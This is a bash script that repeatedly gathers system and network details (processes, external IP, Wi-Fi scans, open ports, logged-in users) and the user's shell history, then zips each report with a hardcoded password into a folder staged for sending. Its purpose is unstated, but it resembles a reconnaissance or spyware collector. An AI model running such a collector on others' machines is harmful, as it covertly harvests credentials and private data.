function space {
	echo "">>report/$DATA/report.txt
	echo "">>report/$DATA/report.txt
}

if [ -n "${1+x}" ]; then
	TTS=$1
else
	TTS=1000
fi

while true
do
	DATA=`date +"%Y-%m-%d-%H-%M-%S"`
	mkdir "report/$DATA"
	touch "report/$DATA/report.txt"
	echo "#################################################################################">>report/$DATA/report.txt
	echo "#">>report/$DATA/report.txt
	echo "#  report created on: $DATA">>report/$DATA/report.txt
	echo "#">>report/$DATA/report.txt
	echo "#################################################################################">>report/$DATA/report.txt
	space
	echo "###################     ps -aux">>report/$DATA/report.txt
	space
	ps aux>>report/$DATA/report.txt
	space
	echo "#################################################################################">>report/$DATA/report.txt
	space
	echo "###################     Current extrenal IP">>report/$DATA/report.txt
	IPcurrent=`curl -s checkip.dyndns.org|sed -e "s/.*Current IP Address: //" -e "s/<.*$//"`
	space
	echo $IPcurrent>>report/$DATA/report.txt
	space
	echo "#################################################################################">>report/$DATA/report.txt
	space
	echo "###################     Traceroute">>report/$DATA/report.txt
	space
	RAND_NUMB=`shuf -i 1-7 | head -1`
	[ $RAND_NUMB -eq 1 ] && traceroute www.google.com>>report/$DATA/report.txt
	[ $RAND_NUMB -eq 2 ] && traceroute www.yahoo.com>>report/$DATA/report.txt
	[ $RAND_NUMB -eq 3 ] && traceroute www.microsoft.com>>report/$DATA/report.txt
	[ $RAND_NUMB -eq 4 ] && traceroute www.aol.com>>report/$DATA/report.txt
	[ $RAND_NUMB -eq 5 ] && traceroute www.onet.pl>>report/$DATA/report.txt
	[ $RAND_NUMB -eq 6 ] && traceroute www.reddit.com>>report/$DATA/report.txt
	[ $RAND_NUMB -eq 7 ] && traceroute www.apple.com>>report/$DATA/report.txt
	space
	echo "#################################################################################">>report/$DATA/report.txt
	space
	echo "###################     Network configuration">>report/$DATA/report.txt
	space
	ifconfig>>report/$DATA/report.txt
	space
	iwconfig>>report/$DATA/report.txt
	space
	iwlist scanning>>report/$DATA/report.txt
	space
	route -n>>report/$DATA/report.txt
	space
	netstat -tulpn>>report/$DATA/report.txt
	space
	echo "#################################################################################">>report/$DATA/report.txt
	space
	echo "###################     Loaded modules">>report/$DATA/report.txt
	space
	lsmod>>report/$DATA/report.txt
	space
	echo "#################################################################################">>report/$DATA/report.txt
	space
	echo "###################     Logged users">>report/$DATA/report.txt
	space
	who>>report/$DATA/report.txt
	space
	echo "###################     Users history">>report/$DATA/report.txt
	space
	cat ~/.bash_history>>report/$DATA/report.txt


	###
	# Preparing report to send
	###
	zip -r tosend/report-$DATA.zip -P 42p6b2V3hy7c92g42p6b2V3hy7c92g report/$DATA
	mv tosend/report-$DATA.zip tosendlater/report-$DATA.zip
	rm report/$DATA/*
	rmdir report/$DATA
	sleep $TTS
done
